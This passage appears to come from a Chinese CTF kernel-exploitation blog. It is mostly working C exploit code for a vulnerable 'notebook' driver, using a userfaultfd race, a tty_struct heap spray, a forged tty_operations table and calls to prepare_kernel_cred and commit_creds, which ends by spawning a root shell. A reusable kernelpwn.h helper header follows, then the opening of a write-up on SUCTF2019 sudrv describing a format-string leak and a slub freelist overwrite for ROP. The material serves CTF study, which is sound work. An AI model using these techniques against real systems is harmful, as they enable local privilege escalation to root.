<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">sem_init</span>(&amp;sem_edit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    note_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, O_RDWR);<br>    buf = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    page_size = <span class="hljs-built_in">sysconf</span>(_SC_PAGE_SIZE);<br><br>    <span class="hljs-built_in">registerUserFaultFd</span>(buf, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">noteAdd</span>(i, <span class="hljs-number">0x20</span>, page);<br>        <span class="hljs-built_in">noteEdit</span>(i, TTY_STRUCT_SIZE, page);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Notebook initialization done.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">pthread_create</span>(&amp;<span class="hljs-type">edit_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-type">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Edit threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">sem_post</span>(&amp;sem_edit);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Edit threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        tty_fd[i] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Heap spray for tty done.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">pthread_create</span>(&amp;<span class="hljs-type">add_t</span>, <span class="hljs-literal">NULL</span>, evilAdd, (<span class="hljs-type">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Add threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">sem_post</span>(&amp;sem_add);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Add threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">noteGift</span>((<span class="hljs-type">char</span>*) notebook);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">read</span>(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (hit_tty = (*((<span class="hljs-type">int</span>*)tty_data) == <span class="hljs-number">0x5401</span>))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n&quot;</span>, tty_idx = i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n&quot;</span>, notebook[i].buf);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!hit_tty)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    tty_ops = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(tty_data + <span class="hljs-number">3</span>);<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base = (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)kernel_base + kernel_offset);<br><br>    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m%p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] prepare_kernel_cred: \033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] commit_creds: \033[0m%p\n&quot;</span>, commit_creds);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] swapgs_restore_regs_and_return_to_usermode: \033[0m%p\n&quot;</span>, SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">read</span>(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (*((<span class="hljs-type">int</span>*)tty_data) != <span class="hljs-number">0x5401</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n&quot;</span>, fake_tty_ops_idx = i);<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake stack at idx \033[0m%d.\n&quot;</span>, fake_stack_idx = i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span> || fake_stack_idx == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unable to find enough available notes, you\&#x27;re so lucky that you got so many tty_structs.&quot;</span>);<br>    <br>    <span class="hljs-built_in">noteEdit</span>(fake_tty_ops_idx, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations), fake_tty_data);<br>    <span class="hljs-built_in">noteEdit</span>(fake_stack_idx, <span class="hljs-number">0x100</span>, rop);<br>    <span class="hljs-built_in">noteGift</span>((<span class="hljs-type">char</span>*) notebook);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n&quot;</span>, notebook[fake_tty_ops_idx].buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake stack: \033[0m%p.\n&quot;</span>, notebook[fake_stack_idx].buf);<br><br>    <span class="hljs-built_in">read</span>(note_fd, tty_data, tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">0x200</span>);<br><br>    ((<span class="hljs-keyword">struct</span> tty_operations *)fake_tty_ops_data)-&gt;ioctl = WORK_FOR_CPU_FN + kernel_offset;<br>    <span class="hljs-built_in">write</span>(note_fd, fake_tty_ops_data, fake_tty_ops_idx);<br><br>    <span class="hljs-built_in">read</span>(note_fd, tty_data, tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">0x200</span>);<br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = prepare_kernel_cred;<br>    fake_tty_data[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">write</span>(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start prepare_kernel_cred(NULL)...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x80</span>; i++)&#123;<br>        <span class="hljs-built_in">ioctl</span>(tty_fd[i], <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">read</span>(note_fd, fake_tty_data, tty_idx);<br><br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = commit_creds;<br>    fake_tty_data[<span class="hljs-number">5</span>] = fake_tty_data[<span class="hljs-number">6</span>];<br><br>    <span class="hljs-built_in">write</span>(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start commit_creds(ROOT)...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        <span class="hljs-built_in">ioctl</span>(tty_fd[i], <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[*] Done.\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">getRootShell</span>();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>kernelpwn.h</strong></p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-type">void</span> * kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pthread_t</span> monitor_thread;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_api</span> uffdio_api;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_register</span> uffdio_register;<br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = <span class="hljs-built_in">syscall</span>(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = <span class="hljs-built_in">pthread_create</span>(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-built_in">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">getuid</span>())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* ------ kernel structure ------ */</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_operations</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_struct</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_driver</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">serial_icounter_struct</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_operations</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_struct</span> * (*lookup)(<span class="hljs-keyword">struct</span> tty_driver *driver,<br>            <span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">int</span> idx);<br>    <span class="hljs-built_in">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-built_in">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-built_in">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>              <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br>    <span class="hljs-built_in">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br>    <span class="hljs-built_in">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*write_room)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*chars_in_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-built_in">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-built_in">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br>    <span class="hljs-built_in">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-built_in">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-built_in">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br>    <span class="hljs-built_in">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br>    <span class="hljs-built_in">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br>    <span class="hljs-built_in">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> set, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br>    <span class="hljs-built_in">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br>    <span class="hljs-built_in">int</span> (*set_termiox)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> termiox *tnew);<br>    <span class="hljs-built_in">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                <span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br>    <span class="hljs-built_in">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br>    <span class="hljs-built_in">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br>    <span class="hljs-built_in">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br>    <span class="hljs-built_in">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_operations</span> *proc_fops;<br>&#125;;<br></code></pre></td></tr></table></figure>

<h2 id="从SUCTF2019sudrv学习slub和modprobe-path"><a href="#从SUCTF2019sudrv学习slub和modprobe-path" class="headerlink" title="从SUCTF2019sudrv学习slub和modprobe_path"></a>从SUCTF2019sudrv学习slub和modprobe_path</h2><p>建议第一次入门接触slub的师傅们先看一下<a target="_blank" rel="noopener" href="https://blog.csdn.net/lukuen/article/details/6935068">linux 内核 内存管理 slub算法 （一） 原理</a>讲的非常详细，看完之后可以更好地理解本文的利用手法。</p>
<p>先来分析一下存在漏洞的驱动程序。<br>首先来看一下sudrv_ioctl函数，给不同的参数，分别执行申请、打印以及释放的功能。释放时将指针置空，不存在UAF漏洞。<br><img src="https://i.imgur.com/lbwVjtl.png" srcset="/img/loading.gif" lazyload><br>在cmd&#x3D;0xdeadbeef时，会执行打印功能，也就是sudrv_ioctl_cold_2函数。这里出现格式化字符串漏洞。<br><img src="https://i.imgur.com/RFmylk0.png" srcset="/img/loading.gif" lazyload><br>在sudrv_write函数中，copy_user_generic_unrolled函数不会检查size的大小，因此可以往su_buf写入大于su_buf大小的内容。<br><img src="https://i.imgur.com/NJfAzym.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="主要思路-1"><a href="#主要思路-1" class="headerlink" title="主要思路"></a>主要思路</h4><p>因为开启了kaslr，所以需要泄露内核的加载基址，执行rop的时候需要将rop写到write函数的返回地址上，因此也需要泄露栈地址。在调用printk时出现格式化字符串漏洞，栈上刚好放着内核地址和栈地址<br><img src="https://i.imgur.com/KXoKU0N.png" srcset="/img/loading.gif" lazyload></p>
<p>因此本题的思路为：<br>1、通过printk格式化字符串漏洞泄露内核加载地址以及栈地址<br>2、通过越界写漏洞覆盖freelist的next指针为write函数的返回地址<br>3、将rop写到write函数的返回地址上</p>
